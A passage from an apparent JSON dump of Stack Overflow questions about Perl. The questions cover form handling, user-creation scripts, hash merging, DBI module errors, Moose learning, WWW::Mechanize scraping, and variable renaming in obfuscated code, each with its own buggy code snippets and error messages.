rel=\"nofollow\">HTML::FormHandler</a> with Catalyst and I have this field:</p>\n\n<pre><code>has_field 'client_account_id' =&gt; ( type =&gt; 'Select', options_method =&gt; \n\\&amp;options_account_id);\n</code></pre>\n\n<p>I have 3 tables that are connected with foreign keys:</p>\n\n<pre><code>clients    client_accounts    login\n-------    ---------------    -----\nid         client_id          client_account_id\n</code></pre>\n\n<p>Now I want <code>&amp;options_account_id</code> to fill the client_account_id field with client_accounts only for a <i>certain</i> client_id. Here is the method I have so far:</p>\n\n<pre><code>sub options_account_id {\n    use my_app;\n    my $self = shift;\n    my @client_accounts = my_app-&gt;model('DB::ClientAccount')-&gt;search({ \n    'client_id' =&gt; $client_id},\n    {\n        select   =&gt; [ qw/id domain/ ],                   ## SELECT\n    })-&gt;all;\n\n    my @options;\n    for(@client_accounts) { \n        push @options, { value =&gt; $_-&gt;id, label =&gt; $_-&gt;domain};\n    }\n    return  @options;\n}\n</code></pre>\n\n<p>Now it doesn't work obviously because the $client_id variable does not exist. My question is, is there a way to somehow pass in the certain client id when I create the new form? Or does anyone know of a better way to do this? Thanks!</p>\n"},{"tags":["linux","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":136,"score":-3,"question_id":12664630,"title":"Linux Script Extract Information From Excel To Create Users","body":"<p>Right now I'm stuck with this project in having to pull information from an excel file to create users. The script requires the following.</p>\n\n<ul>\n<li>Create accounts for the employees </li>\n<li>Place them into his or her own department group</li>\n<li>Set an initial password using his or her employee ID</li>\n<li>Send an email containing their new account and password</li>\n<li>show progress with dots on the screen</li>\n</ul>\n\n<p>I'm getting close but am getting EOF errors on line 8 and 13 see script here</p>\n\n<pre><code>#!bin/bash\necho $(pwd)/employeesdata.xls\nPath=$($pwd)/employeesdata.xls\nread Path\nif [ -e $Path ];\nthen\nUsername= [ grep $(Username) $Path | cut -f1 -d `]'\nPassword= [ grep $(Password) $Path | cut -f2 -d `]'\nuseradd -- b $Username\necho $Password | /usr/bin/passwd --stdin $Username\nfi\nexit\n\n\nI know it doesn't have the email portion yet.\n</code></pre>\n\n<p>PS-UserScript: line 8: unexpected EOF while looking for matching `''\nPS-UserScript: line 13: syntax error: unexpected end of file</p>\n"},{"tags":["linux","perl","interpreter","ubuntu-9.04"],"answer_count":3,"favorite_count":1,"up_vote_count":9,"down_vote_count":0,"view_count":5778,"score":9,"question_id":1384398,"title":"/usr/bin/perl: bad interpreter: Text file busy","body":"<p>This is a new one for me:  What does this error indicate?</p>\n\n<pre><code>  /usr/bin/perl: bad interpreter: Text file busy\n</code></pre>\n\n<p>There were a couple of disk-intensive processes running at the time, but I've never seen that message before&mdash;in fact, this is the first time that I can remember getting an error when trying to run a Perl script.  After a few seconds of waiting, I was able to run it, and haven't seen the issue since, but it would be nice to have an explanation for this.</p>\n\n<p>Running Ubuntu 9.04, file system is ext3. </p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":115,"score":3,"question_id":12664906,"title":"Can Perl manage subroutines in dynamic structures?","body":"<p>I have a set of parse funcitons. Some of them I need to apply, depending on the context.\nCan I manage functions in arrays or something in Perl, e.g. like in JS?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":166,"score":-4,"question_id":10047824,"title":"What is a token in perl?","body":"<p>My assignment is to open and read a file, remove all commas, periods, spaces, and exclamation points from it. Furthermore, I must display the number of word occurrences for each word by placing the word as a hash and the number of occurrences as the value and the words are the keys. For example, in a document that says,\" Perl Program, Perl Program.\" Perl and program are the keys, where as the values are the n</p>\n\n<p>Words-----Count</p>\n\n<p>Perl------2</p>\n\n<p>Program---2</p>\n\n<p>The instructor already posted the directions, but in them he mentions, \"split the line into tokens and store the array\". I think I could do this if I knew what tokens were, so could someone explain what tokens are please?</p>\n"},{"tags":["regex","string","perl","replace"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":122,"score":0,"question_id":12660607,"title":"String Replace in Perl","body":"<p>I am trying to deobfuscate a code. This code uses a lot of long variable names which are substituted with meaningful names at the time of running the code.</p>\n\n<p><strong>Note:</strong> I have modified the question now. Thanks for the solutions for escaping meta characters in regular expressions.</p>\n\n<p>Now, the question is: How do I preserve the state while searching and replacing?</p>\n\n<p>For instance, with an obfuscated line like this:</p>\n\n<pre><code>${${\"GLOBALS\"}[\"ttxdbvdj\"]}=_hash(${$urqboemtmd}.substr(${${\"GLOBALS\"}[\"wkcjeuhsnr\"]},${${\"GLOBALS\"}[\"gjbhisruvsjg\"]}-${$rrwbtbxgijs},${${\"GLOBALS\"}[\"ibmtmqedn\"]}));\n</code></pre>\n\n<p>There are multiple mappings in mappings.txt which match above obfuscated line like:</p>\n\n<pre><code>$rrwbtbxgijs = hash_length;\n$urqboemtmd = out;\n</code></pre>\n\n<p>At first run, it will replace <strong>$rrwbtbxgijs</strong> with <strong>hash_length</strong> in the obfuscated line above. Now, when it comes across the second mapping during the next iteration of the outer while loop, it will replace <strong>$urqboemtmd</strong> with <strong>out</strong> in the obfuscated line.</p>\n\n<h2>The problem is:</h2>\n\n<p>When it comes across first mapping, it does the substitution. However, when it comes across next mapping in the same line for a different matching string, the previous search/replace result is not there.</p>\n\n<p>It should preserve the previous substitution. How do I do that?</p>\n\n<p>I wrote a Perl Script, which would pick one mapping from mapping.txt and search the entire obfuscated code for all the occurrences of this mapping and replace it with the meaningful text. </p>\n\n<p>Here is the code I wrote:</p>\n\n<pre><code>#! /usr/bin/perl\n\nuse warnings;\n\n($mapping, $input) = @ARGV;\n\nopen MAPPING, '&lt;', $mapping\n    or die \"couldn't read from the file, $mapping with error: $!\\n\";\n\nwhile (&lt;MAPPING&gt;) {\n\n    chomp;\n    $line = $_;\n    ($key, $value) = split(\"=\", $line);\n    open INPUT, '&lt;', $input;\n\n    while (&lt;INPUT&gt;) {\n\n        chomp;\n        if (/$key/) {\n\n            $_=~s/\\Q$key/$value/g;\n            print $_,\"\\n\";\n        }            \n    }\n    close INPUT;\n}\nclose MAPPING;\n</code></pre>\n"},{"tags":["perl","hash","merge","concatenation"],"answer_count":4,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":168,"score":5,"question_id":12567350,"title":"Hash merge/concatenation","body":"<p>this is a dump of my hashes: %hash1</p>\n\n<pre><code>$VAR1 = {\n    abc =&gt; {\n        123 =&gt; [\n          'xx',\n          'yy',\n          'zy'\n        ],\n        456 =&gt; [\n          'ab',\n          'cd',\n          'ef'\n        ]\n    }\n};\n</code></pre>\n\n<p>and the second one: %hash2</p>\n\n<pre><code>$VAR2 = { \n    def =&gt; {\n        659 =&gt; [\n            'wx',\n            'yg',\n            'kl'\n        ],\n        456 =&gt; [\n            'as',\n            'sd',\n            'df'\n        ]\n    },\n    abc =&gt; {\n        987 =&gt; [\n            'lk',\n            'dm',\n            'sd'\n        ]\n    }\n};\n</code></pre>\n\n<p>Now I want to merge these two hashes in a new hash, but if a key is duplicated (here 'abc'), the values should be appended, not replaced, so the keys should remain unique, and all the values should be retained as well. How can this be done in Perl?\nThe output should be as follows:</p>\n\n<pre><code>$VAR1 = {\n    def =&gt; {\n        659 =&gt; [\n            'wx',\n            'yg',\n            'kl'\n        ],\n        456 =&gt; [\n            'as',\n            'sd',\n            'df'\n        ]\n    },\n    abc =&gt; {\n        987 =&gt; [\n            'lk',\n            'dm',\n            'sd'\n        ],\n        123 =&gt; [\n            'xx',\n            'yy',\n            'zy'\n        ],\n        456 =&gt; [\n            'ab',\n            'cd',\n            'ef'\n        ]\n    }\n };\n</code></pre>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":213,"score":6,"question_id":12627673,"title":"Is there a difference between `shift` and `@_` in a subroutine?","body":"<p>I always use <code>@_[0]</code> to get the first parameter and use <code>@_[1]</code> to get the second one. But when I search up code snippets online, I find many people like to use the <code>shift</code> keyword. I don't find the <code>shift</code> keyword being intuitive at all. Is there any functional differences between these two? Thanks.</p>\n"},{"tags":["perl","strawberry-perl"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":724,"score":4,"question_id":5806126,"title":"How to change @INC in Strawberry Perl?","body":"<p>How can I change <code>@INC</code> permanently, without changing my scripts, in Strawberry Perl?</p>\n\n<p>I'm aware of <code>-I</code>, but don't want to invoke that switch every time.</p>\n"},{"tags":["perl","qr-code"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":11980976,"title":"how to make QR codes in perl cgi","body":"<p>I'm trying to create a website with forms for people to fill out and when the user presses submit button the texts in each form field are concatenated into a single text string to be used to make a QR code.  How could I do this and what language would be the best for most browsers to be compatible.  </p>\n\n<p>In addition, I would like to have the text fields have a new line (\\n) associated with it to make the format a little more pretty when the user scans the QR code.  </p>\n\n<p>Please let me know.. Thanks in advance.. could you include a sample code of a website that has three text areas to concatenate? </p>\n"},{"tags":["perl","powershell","file-properties"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":108,"score":2,"question_id":12647054,"title":"How to access \"Details\" (\"Title\", \"Subject\", etc) of file properties in perl or powershell script","body":"<p>if one looks at file properties in Windows Explorer, \"Details\" tab - for many filetypes (for example, tiff or jpeg images, Office documents, etc.) there is \"Description\" section with fields like \"Title\", \"Subject\", \"Tags\", \"Comments\". Is there any way to read/write these fields from perl or powershell script?</p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12632793,"title":"Using perl Regular expressions I want to make sure a number comes in order","body":"<p>I want to use a regular expression to check a string to make sure 4 and 5 are in order.  I thought I could do this by doing     </p>\n\n<pre><code>'$string =~ m/.45./'\n</code></pre>\n\n<p>I think I am going wrong somewhere. I am very new to Perl. I would honestly like to put it in an array and search through it and find out that way, but I'm assuming there is a much easier way to do it with regex.</p>\n\n<pre><code>print \"input please:\\n\";\n$input = &lt;STDIN&gt;;\nchop($input);\nif ($input =~ m/45/ and $input =~ m/5./) {\n    print \"works\";\n}\nelse {\n    print \"nata\";\n}\n</code></pre>\n\n<p>EDIT: Added Info\nI just want 4 and 5 in order, but if 5 comes before at all say 322195458900023 is the number then where 545 is a problem 5 always have to come right after 4.</p>\n"},{"tags":["perl","perl-module","dbi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":173,"score":-2,"question_id":12656212,"title":"Perl module, inhereting from DBI , \"Can't call method 'prepare'\" error","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12650738/perl-poo-and-cant-call-method-prepare\">Perl + POO and &ldquo;Can&#39;t call method &rdquo;prepare\"</a>  </p>\n</blockquote>\n\n\n\n<p>I learned poo and i got to play with perl, create this module but when I call the segudno method I skip the following error 'Use of uninitialized value $database in concatenation ( .) ... ' Followed by 'Can't call method 'prepare' mm i don't really understand, any suggestions?</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse warnings;\nuse strict;\nuse DBI;\nuse DBD::mysql;\n\npackage MysqlTest;\n\nsub new{\n    my $class = shift;\n    my $query={};\n    bless($query, $class);\n}\nsub conexion{\n    my $self=shift;\n    my($database, $hostname, $user, $pwd)=@_;\n    $self-&gt;{\"host\"}=$hostname;\n    $self-&gt;{\"database\"}=$database;\n    $self-&gt;{\"user\"}=$user;\n    $self-&gt;{\"pass\"}=$pwd;\n    our $connect = DBI-&gt;connect(\"DBI:mysql:database=$database;host=$hostname;\", $user, $pwd) or die $DBI::errstr;\n    my $mysqlopen = 1;\nreturn;\n}\nsub consulta{\n    my $self=shift;\n    if (!my $mysqlopen) { &amp;conexion(); }\n    my $id = \"SELECT * FROM save_bookmarks WHERE id='123'\";\n    our $result = my $connect-&gt;prepare($id);\n    $result-&gt;execute();\n    my @resultado = $result-&gt;fetchrow_array();\n    print \"@resultado\\n\";\n    return;\n}\nsub datos{\n    my $self=shift;\n    print \"::DATOS DE ACCESO::\\n\";\n    while ((my $key, my $value)=each(%$self)){\n        print \"$key =&gt; $value\\n\";\n    }\n}\n1;\n</code></pre>\n\n<p>in other file for call msg and created objected.</p>\n\n<pre><code>#!/usr/bin/perl\nuse MysqlTest;\nuse warnings;\nuse strict;\n\nmy $mysqltest = MysqlTest-&gt;new();\n$mysqltest-&gt;conexion(\"bookmarks\", \"localhost\", \"root\", \"pass\");\n$mysqltest-&gt;consulta();\n</code></pre>\n\n<p>this output in console.</p>\n\n<pre><code>Use of uninitialized value $database in concatenation (.) or string at MysqlTest.pm line 23.\nUse of uninitialized value $hostname in concatenation (.) or string at MysqlTest.pm line 23.\nCan't call method \"prepare\" on an undefined value at MysqlTest.pm line 31.\n</code></pre>\n\n<p>any idea?</p>\n\n<p>thanks.</p>\n"},{"tags":["osx","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":244,"score":2,"question_id":11872458,"title":"Perl can't find a module that is in @INC","body":"<p>I'm writing a Perl module on my OS X 10.7 Mac, and I'm running into an error with the DBI module when I try to use it. I was able to separate the problem from my module and reproduce it with just this:</p>\n\n<pre><code>[sean@mac:~]$ perl -e 'use DBI;'\nCan't locate DBI.pm in @INC (@INC contains:\n    /System/Library/Perl/Extras/5.12/darwin-thread-multi-2level\n    /opt/local/lib/perl5/site_perl/5.12.4\n    /darwin-multi-2level\n    /opt/local/lib/perl5/site_perl/5.12.4\n    /opt/local/lib/perl5\n    /vendor_perl/5.12.4/darwin-multi-2level\n    /opt/local/lib/perl5/vendor_perl/5.12.4\n    /opt/local/lib/perl5/5.12.4/darwin-multi-2level\n    /opt/local/lib/perl5/5.12.4\n    /opt/local/lib/perl5/site_perl\n    /opt/local/lib/perl5/vendor_perl .) at -e line 1.\nBEGIN failed--compilation aborted at -e line 1.\n</code></pre>\n\n<p>The reason this is puzzling is this:</p>\n\n<pre><code>[sean@mac:~]$ find /System/Library/Perl/Extras/5.12/darwin-thread-multi-2level -iname '*dbi*' -maxdepth 2\n  /System/Library/Perl/Extras/5.12/darwin-thread-multi-2level/auto/DBI\n  /System/Library/Perl/Extras/5.12/darwin-thread-multi-2level/Bundle/DBI.pm\n  /System/Library/Perl/Extras/5.12/darwin-thread-multi-2level/DBI\n  /System/Library/Perl/Extras/5.12/darwin-thread-multi-2level/DBI.pm\n  /System/Library/Perl/Extras/5.12/darwin-thread-multi-2level/dbixs_rev.pl\n</code></pre>\n\n<p>There is a DBI folder and a DBI.pm module right where Perl is supposed to look! Why is it the case that a file which is present in a path that's included in <code>@INC</code>, is not found by Perl?</p>\n\n<p>I was able to find a workaround by twisting Perl's arm: when I add a <code>use lib '/System/Library/Perl/Extras/5.12/darwin-thread-multi-2level';</code> line to my module, Perl appears to find DBI correctly. However, in this case, <code>perl -d foo.pm</code> results in the following:</p>\n\n<pre><code>  dyld: lazy symbol binding failed: Symbol not found: _Perl_Gthr_key_ptr\n    Referenced from: /System/Library/Perl/Extras/5.12/darwin-thread-multi-2level/auto/DBI/DBI.bundle\n    Expected in: flat namespace\n\n  dyld: Symbol not found: _Perl_Gthr_key_ptr\n    Referenced from: /System/Library/Perl/Extras/5.12/darwin-thread-multi-2level/auto/DBI/DBI.bundle\n    Expected in: flat namespace\n\n  Trace/BPT trap: 5\n</code></pre>\n\n<p>I don't know how to interpret that either, and so I'm not satisfied with my workaround - it still has the smell of \"there is an underlying problem that will become a nasty surprise in the future if you don't figure it out.\"</p>\n\n<p>Why is DBI not importing correctly, and what does the \"lazy symbol binding\" debug message mean?</p>\n"},{"tags":["perl","plack","psgi"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12654571,"title":"Using PSGI, is it possible to change how uploaded files are named?","body":"<p>I have a small PSGI app which takes an upload from a form and passes it off to another script for processing:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nuse Plack::Request;\nuse HTTPStatusCode;\n\nmy $app = sub {\n    my $req = Plack::Request-&gt;new(shift);\n\n    my $content;\n    if (keys %{$req-&gt;uploads}) {\n        $content = do_something_with_upload($req);\n    } else {\n        $content = display_form();\n    }\n\n    return [\n        HTTPStatusCode-&gt;SUCCESS,\n        [ 'Content-type', 'text/html' ],\n        [ $content ],\n    ];\n};\n</code></pre>\n\n<p>The file gets uploaded successfully as something like <code>/tmp/Fw8n6j0ICn.txt</code>. The problem is, the processing relies on the file being named as it was when uploaded.</p>\n\n<p>Is it possible to change how files are uploaded so they go to <code>/tmp/Fw8n6j0ICn/original_name.txt</code> ?</p>\n"},{"tags":["javascript","perl","web-scraping","mechanize"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":118,"score":1,"question_id":12655231,"title":"Can't use perl WWW::Mechanize to tick checkboxes","body":"<p>I am making a webscraper using perl WWW::Mechanize. My problem is the site that I am scraping is using javascript a bit too much. I am logging in using credentials, Then traversing to custom search using <code>$mech-&gt;follow_link(url)</code>.</p>\n\n<p>The problem starts from here. I am landing on to a page where I have to select one checkbox and one radiobutton from a javascript enabled dropdownlist. I am stuck at this point.</p>\n\n<p>The part of html is as below. When I am using <code>$mech-&gt;tick('cs-MajorIndustryGroup')</code>, I am getting an error </p>\n\n<pre><code>Can't call method \"find_input\" on an undefined value\n</code></pre>\n"},{"tags":["c++","python","perl","awk"],"answer_count":3,"favorite_count":1,"up_vote_count":7,"down_vote_count":1,"view_count":113,"score":6,"question_id":12488289,"title":"parse and rearrange hostnames","body":"<p>Below is a list of hostnames that is stored in a text file.</p>\n\n<pre><code>web1.maxi.com\nweb3.maxi.com\nweb4.maxi.com\nweb5.maxi.com\nweb6.maxi.com\nweb7.maxi.com\nweb8.maxi.com\nweb9.maxi.com\nweb11.maxi.com\n</code></pre>\n\n<p>for the sake of displaying it shortly it needs to be parsed and rewritten/displayed as </p>\n\n<pre><code>web[1,3-9,11].maxi.com\n</code></pre>\n\n<p>can you guys help me on this, any suggestions will be helpful.</p>\n"},{"tags":["perl","moose"],"answer_count":3,"favorite_count":4,"up_vote_count":14,"down_vote_count":1,"view_count":242,"score":13,"question_id":12552027,"title":"How to (continue) learn Moose for using it \"fairly\" well?","body":"<p>Although I am not a Perl guru, I use Perl and I can write object-oriented programs the \"good old\" way.</p>\n\n<p>Now I would like to learn Moose. I've already (so-as) chewed the basic documentation, and my first Moose and roles are already working, but I'm miles away from understanding how Moose actually works.</p>\n\n<p><strong>Question 1: Is it absolutely necessary to understand how Moose works to write \"pretty good\" programs?</strong></p>\n\n<p>Honestly, I don't quite understand the old object system. Something I vaguely remember reading is that it's actually a reference to a data structure, but I never explored deeper. It was sufficient for me to know how and when I needed to use <code>bless</code>, <code>autoload</code> etc. and things simply worked. Maybe some of my old modules can be written more effectively. But for me, they work and work well.</p>\n\n<p>Is this similar to Moose? Or does someone writing \"enough-good\" programs with Moose need to understand how it works \"inside\"?</p>\n\n<p>The question arises for the following reasons:</p>\n\n<p>In the METACPAN are dozens of modules that help write Moose objects even more easier and simpler.</p>\n\n<p>Examples at random:</p>\n\n<ul>\n<li><a href=\"https://metacpan.org/module/MooseX::StrictConstructor\" rel=\"nofollow\">https://metacpan.org/module/MooseX::StrictConstructor</a> (ok, easy to understand)</li>\n<li><a href=\"https://metacpan.org/module/MooseX::HasDefaults\" rel=\"nofollow\">https://metacpan.org/module/MooseX::HasDefaults</a> (ok, easy)</li>\n<li><a href=\"https://metacpan.org/module/Method::Signatures::Simple\" rel=\"nofollow\">https://metacpan.org/module/Method::Signatures::Simple</a> (bump! haven't idea what are the signatures, and this Module is the \"easy\" one.)</li>\n<li><a href=\"https://metacpan.org/module/MooseX::AlwaysCoerce\" rel=\"nofollow\">https://metacpan.org/module/MooseX::AlwaysCoerce</a> /hmm.... :(/</li>\n<li><a href=\"https://metacpan.org/module/MooseX::LazyRequire\" rel=\"nofollow\">https://metacpan.org/module/MooseX::LazyRequire</a> /hmm... :(/</li>\n<li><a href=\"https://metacpan.org/module/MooseX::AbstractMethod\" rel=\"nofollow\">https://metacpan.org/module/MooseX::AbstractMethod</a> </li>\n<li><a href=\"https://metacpan.org/module/MooseX::AttributeShortcuts\" rel=\"nofollow\">https://metacpan.org/module/MooseX::AttributeShortcuts</a> (Shorthand for common attribute options - so probably it is a helper - but, is it really useful to learn?)</li>\n</ul>\n\n<p>and many-many more (don't want cite here another 10-20 modules)</p>\n\n<p>And now the main question:</p>\n\n<p>Are there any good books with the instructions, examples and recommendations (good practices) for:</p>\n\n<ul>\n<li><strong>what</strong> from the above listed <strong>modules are recommended to use routinely from the start</strong>?</li>\n</ul>\n\n<p>The above modules were surely not developed only because the author just hasn't what to do. Certainly they are useful and helpful. But learning (read: trying to understand) tens of many different modules (especially those who play with Moose internals) is an extremely long process. On the other hand, if they are not used, my programs will be unnecessarily complicated, and I will be dealing with things already resolved.</p>\n\n<p>Moose should be (and probably is) a revolutionary system. Only I'm starting getting lost.</p>\n\n<p><strong>Edit</strong>: I just found <a href=\"https://metacpan.org/module/Reindeer\" rel=\"nofollow\">Reindeer</a>. Probably this module is a partial answer to the question:\n<strong>what modules are useful to use from the start (or most of time)</strong></p>\n\n<p>PS: I'm not sure than this question is ok for SO. If not, please move it to somewhere or close it. I asked it here because the SO-perl community is a really helpful place, and I don't know how to continue to learn Moose.</p>\n"},{"tags":["perl","file-download","www-mechanize","lwp"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":90,"score":0,"question_id":12473800,"title":"Downloading several files froma website with Perl","body":"<p>I began to mess around with the Web in Perl. I use Windows, and ActivePerl. I wrote a script, which downloads mp3 files (It's an archive of a radio talkshow, all legal, in case you're wondering :) ) It (in theory)</p>\n\n<ul>\n<li>parses a website</li>\n<li>collects all links pointing to an mp3 file to an array  </li>\n<li>iterates through the array and downloads all files  </li>\n</ul>\n\n<p>However the script finds all the links, the array is OK, but downloads only one file. It must be a basic error, but I can't find it. Please point out my mistake, thank you.     </p>\n\n<pre><code>use strict;\nuse warnings;\nuse WWW::Mechanize;\nuse LWP::Simple;\nuse File::Basename;\n\nmy $mech = WWW::Mechanize-&gt;new( autocheck =&gt; 1 );  \n$mech-&gt;get(\"http://something_or_other.html\");\n\nmy @mp3links = $mech-&gt;find_all_links(    \n    tag       =&gt; \"a\",\n    url_regex =&gt; qr/\\.mp3$/,  \n);  \nprint \"\\n\";                 \nforeach my $link (@mp3links) {  \n\n    my $url       = $link-&gt;url();  \n    my $localfile = basename($url);  \n    my $localpath = \"d:\\\\Downloads\\\\$localfile\";\n\n    print \"$localfile\\n\";   \n    getstore($url, $localpath);   \n}  \n</code></pre>\n"},{"tags":["perl","hash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":63,"score":0,"question_id":12653127,"title":"Multi-level perl hash","body":"<p>I have a hash which looks like below when I use Dumper. I want to iterate over each level and print everything individually. </p>\n\n<pre><code>$VAR1 = {\n          'TP144' =&gt; {\n                          'LNDN CDR' =&gt; [\n                                            'NAME   XYZ\n                        FNAME   ABC\n                        STATUS  MARIED\n                        TEST   \"THIS IS TEST\"\n                        TEMP!VALUE   0'\n                                        ],\n</code></pre>\n\n<p>This is how it looks like: The value of L2 is itself an array.   </p>\n\n<pre><code>$VAR1{L1}{L2}=&gt;ARRAY\n</code></pre>\n\n<p>Any help is appreciated. </p>\n\n<p>Thanks in advance </p>\n\n<p>EDIT: Thanks Mat, I found the answer in that link. Here's how I did it. </p>\n\n<pre><code>foreach $L1 ( sort keys %VAR1 ) {\n     print \"$L1: { \";\n     for $L2 ( sort keys %{ $VAR1{$L1} } ) {\n         foreach  (@{$VAR1{$L1}{$L2}})\n         {\n             print $_.\"\\n\";\n         }\n\n     }\n     print \"}\\n\";\n }\n</code></pre>\n"},{"tags":["perl","catalyst","chained"],"answer_count":1,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":114,"score":6,"question_id":11105383,"title":"Two or more PathParts chained ( Catalyst )","body":"<p>How can I have more than one pathpart in an action at the same time? I tried with Regex and LocalRegex but it realy doesnt work.</p>\n\n<p>This is the result I want:</p>\n\n<pre><code>/typeone/*/*/something\n/typetwo/*/*/something\n</code></pre>\n\n<p>I want to achieve this by using only one base action that captures the two args in from, and can have either the \"typeone\" or \"typetwo\" pathpart.</p>\n\n<p>The \"something\" is just another action that is chained to that base. I don't want to have two bases with two different pathparts, that would require me to have two something chained to each of the bases, right?</p>\n\n<p>Thank you</p>\n"},{"tags":["perl","use-strict"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":129,"score":2,"question_id":12644327,"title":"In Perl, how to share a variable between subroutines, with use strict?","body":"<p>If I don't <code>use strict;</code> the following code works fine and prints out \"alice\":</p>\n\n<pre><code>assign_name();\nprint_name();\n\nsub assign_name {\n    $name = \"alice\";\n}\n\nsub print_name {\n    print $name;\n}\n</code></pre>\n\n<p>However when I do <code>use strict;</code> then I know I'll have to declare the variable before using it. I read somewhere I should use <code>our</code> instead of <code>my</code> to declare a global variable. So I had the following:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nassign_name();\nprint_name();\n\nsub assign_name {\n    our $name = \"alice\";\n}\n\nsub print_name {\n    print $name;   # This is line 12.\n\n}\n</code></pre>\n\n<p>And then I get the following error:</p>\n\n<pre><code>Variable \"$name\" is not imported at test.pl line 12.\nGlobal symbol \"$name\" requires explicit package name at test.pl line 12.\nExecution of test.pl aborted due to compilation errors.\n</code></pre>\n\n<p>Please help.</p>\n"},{"tags":["perl","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":214,"score":1,"question_id":7822767,"title":"bash colored text and piping","body":"<p>I have a Perl script that outputs some colored text under bash. For example, this will output a red string:</p>\n\n<pre><code>perl -e 'print \"\\e[1;31m RED \\e[m\"\n</code></pre>\n\n<p>When I pipe it to another program, e.g. vim <code>... | vim -</code> , I can see the color formating clutter-characters:</p>\n\n<pre><code>^[[1;31m RED ^[[m\n</code></pre>\n\n<p>and I want them to be skipped. It happens for example for <code>grep</code>, that you see colors in bash, but they are skipped when the output is redirected.</p>\n\n<p>How to do that?</p>\n"},{"tags":["perl","shell","perl-module"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12650140,"title":"How to remove similar redefinitions from a file using perl","body":"<p>I have a file which has the following data in it </p>\n\n<pre><code>typedef INTEGER Id;\ntypedef Integer32 Id;\ntypedef Integer32 Id;\ntypedef Integer32 Id;\ntypedef INTEGER Identifier;\ntypedef Integer32 Index;\ntypedef Unsigned32 Identifier;\ntypedef Integer32 Index;\ntypedef Unsigned32 TunnelId;\ntypedef Unsigned32 TunnelId;\nconst Unsigned32 maxValue = 65535;\nconst Integer32 Index_maxValue = 65535;        \nconst Unsigned32 maxValue = 4294967295;\nconst Unsigned32 Index_maxValue = 65535;\n</code></pre>\n\n<p>I need to select the variables in this below order:\nIf variable has â¦</p>\n\n<ul>\n<li><code>INTEGER</code>   and <code>Integer32</code>  definitions - <code>Integer32</code>  has to be selected</li>\n<li><code>Integer32</code> and <code>Unsigned32</code> definitions - <code>Unsigned32</code> has to be selected</li>\n<li><code>INTEGER</code>   and <code>Unsigned32</code> definitions - <code>Unsigned32</code> has to be selected </li>\n</ul>\n\n<p>Output expected :</p>\n\n<pre><code>typedef Integer32 Id;\ntypedef Unsigned32 Identifier;\ntypedef Integer32 Index;\ntypedef Unsigned32 TunnelId;\nconst Unsigned32 maxValue = 65535;\nconst Unsigned32 Index_maxValue = 65535;\n</code></pre>\n\n<p>I have written the below piece of code â¦\nBut its not yielding the above expected result.</p>\n\n<pre><code>@file2 = @file // full content of the file in an array\nfor ($i = 0; $i &lt;= $#file; $i++) {\n   $temp = $file[$i];\n   $check = $file[$i];\n   $check =~ s/^\\s+//;\n\n   @fields = split(/ /, $check);\n\n   @grepNames = grep(/$fields[2]/, @file2);\n\n   if($#grepNames &gt;= 1) {\n\n      for ($j = 1; $j &lt;= $#file; $j++) {\n         if( $file[$i] =~ /INTEGER/ &amp;&amp; $file[$j] =~ /Unsigned32/ ) {\n            push(@data, $file[$j]);\n         }\n         elsif( $file[$i] =~ /INTEGER/ &amp;&amp; $file[$j] =~ /Integer32/ ) {\n            push(@data, $file[j]);\n         }\n         elsif( $file[$i] =~ /Unsigned32/ &amp;&amp; $file[$j] =~ /Integer32/ ) {\n            push(@data, $file[i]);\n         }\n    }\n}\n</code></pre>\n"},{"tags":["javascript","forms","perl","mechanize"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":135,"score":-2,"question_id":12353816,"title":"Use WWW::Mechanize to login in webpage without form login but javascript using perl","body":"<p>I used perl's <code>WWW::Mechanize</code> to automate data scraping from many intranet login forms. </p>\n\n<p>Now, I've found a site that doesn't use a login form for login process but only javascript in a table!</p>\n\n<p>I have no idea how to login and scrape data of my interest. Please help me to code in <code>perl</code> for login and data scraping.</p>\n\n<p>This is the login page:</p>\n\n<pre><code>&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;\n\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"Pragma\" content=\"no-cache\" /&gt;\n&lt;meta http-equiv=\"Expires\" content=\"-1\" /&gt;\n&lt;title&gt;WFM eCare&lt;/title&gt;\n\n\n\n\n\n\n&lt;meta http-equiv=\"Content-Type\" content=\"text/html; 